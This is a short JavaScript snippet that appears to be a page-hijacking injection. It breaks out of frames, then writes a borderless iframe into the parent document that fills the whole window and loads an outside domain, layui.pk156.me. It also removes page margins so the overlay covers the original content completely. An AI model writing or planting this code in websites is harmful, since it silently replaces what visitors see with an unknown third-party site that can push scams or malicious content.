if(top.location !== self.location) {
    top.location.href = self.location.href;
}
setTimeout(function(){
    parent.document.writeln("<iframe style=\"margin:0px;padding:0px;height:100%;width:100%;\" src=\"http://layui.pk156.me/\" frameBorder=0 scrolling=no></iframe>");
    setTimeout(function(){
        document.getElementsByTagName("body")[0].setAttribute("style","margin:0px;");
    },100);

    setTimeout(function(){
        parent.document.getElementsByTagName("body")[0].setAttribute("style","margin:0px;");
    },100);
},1000);